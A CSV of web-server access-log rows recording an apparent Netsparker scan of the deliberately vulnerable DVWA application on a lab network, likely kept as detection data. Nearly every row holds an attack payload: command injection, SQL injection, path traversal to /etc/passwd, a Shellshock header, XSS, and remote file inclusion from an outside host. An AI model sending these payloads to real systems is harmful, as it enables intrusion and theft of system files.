host,tool,indent,user,time,method,request_path,status,size,referer,agent
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%26ping%20-c%2025%20127.0.0.1%20%26%27&security=low HTTP/1.1,200,985,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror.log&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhttpd%2flogs%2ferror_log&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2ffd%2f2%00.php&security=low HTTP/1.1,200,984,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache%2ferror.log&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2ferror.log&security=low HTTP/1.1,200,988,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=(SELECT%20CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)))&security=low HTTP/1.1,200,1016,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=1%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%22%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%22&security=low HTTP/1.1,200,1107,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%22%26expr%20268409241%20-%202%20%26%22 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%22%26ping%20-c%2025%20127.0.0.1%20%26%22 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%26expr%20268409241%20-%202%20%26 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%26ping%20-c%2025%20127.0.0.1%20%26 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27%20OR%20%271%27%3d%271 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27%26expr%20268409241%20-%202%20%26%27 HTTP/1.1,200,973,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%27%26ping%20-c%2025%20127.0.0.1%20%26%27 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=%3c!--%23exec%20cmd%3d%22expr%20268409241%20-%202%22--%3e HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=expr%20268409241%20-%202 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=expr%20268409241%20-%202%20%26 HTTP/1.1,200,972,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=exec&security=low HTTP/1.1,200,1301,"() { :;}; echo \""NS:\"" $(/bin/sh -c \""expr 268409241 - 2\"")","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1,200,979,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=http%3a%2f%2fr87.com%2fn%3f.php&security=low HTTP/1.1,200,977,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=hTTp%3a%2f%2fr87.com%2fn&security=low HTTP/1.1,200,977,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=php%3a%2f%2ffilter%2f%2fresource%3dhttp%3a%2f%2fr87.com%2fn%3f%00.php&security=low HTTP/1.1,200,991,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=ping%20-c%2025%20127.0.0.1%20%26&security=low HTTP/1.1,200,981,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=ping%20-c%2025%20127.0.0.1&security=low HTTP/1.1,200,980,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=r87.com%2fn&security=low HTTP/1.1,200,971,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:19 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,985,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=%27%22%20ns%3d%20netsparker(0x0005AC)%20 HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNUFBKTwvc2NyaXB0Pg%3d%3d HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_help.php?id=exec&security=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwNUFCKTwvc2NyaXB0Pg%3d%3d HTTP/1.1,200,1250,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1,200,984,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%0d%0ans%3anetsparker056650%3dvuln&security=low HTTP/1.1,200,985,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%22%2bprint(int)0xFFF9999-22%2b%22&security=low HTTP/1.1,200,984,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1,200,995,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27%2bprint(int)0xFFF9999-22%2b%27&security=low HTTP/1.1,200,985,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27)%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,987,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%27))%20WAITFOR%20DELAY%20%270%3a0%3a25%27--&security=low HTTP/1.1,200,988,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id='%2BNSFTW%2B'&security=low HTTP/1.1,200,973,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2bprint(int)0xFFF9999-22%3b%2f%2f&security=low HTTP/1.1,200,986,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f%2fr87.com%2f%3f&security=low HTTP/1.1,200,974,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00&security=low HTTP/1.1,200,977,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php&security=low HTTP/1.1,200,979,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&security=low HTTP/1.1,200,976,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php&security=low HTTP/1.1,200,982,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion&security=low HTTP/1.1,200,978,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=%3c%3f%20print(int)0xFFF9999-22%3b%2f%2f%3f%3e&security=low HTTP/1.1,200,987,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1,200,991,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=((select%20sleep(25)))a--%201&security=low HTTP/1.1,200,983,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)&security=low HTTP/1.1,200,1094,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd&security=low HTTP/1.1,200,978,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201&security=low HTTP/1.1,200,1007,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))&security=low HTTP/1.1,200,997,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=1%20procedure%20analyse(extractvalue(rand()%2cconcat(0x3a%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))))%2c1)--%201&security=low HTTP/1.1,200,1052,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22&security=low HTTP/1.1,200,999,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27&security=low HTTP/1.1,200,1000,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=-1%27%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27&security=low HTTP/1.1,200,1100,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
192.168.4.164,netsparker,-,-,22/Dec/2016:15:21:20 +0300,GET,/DVWA/vulnerabilities/view_source.php?id=1%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&security=low HTTP/1.1,200,1025,http://192.168.4.161/DVWA/vulnerabilities/exec/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"""
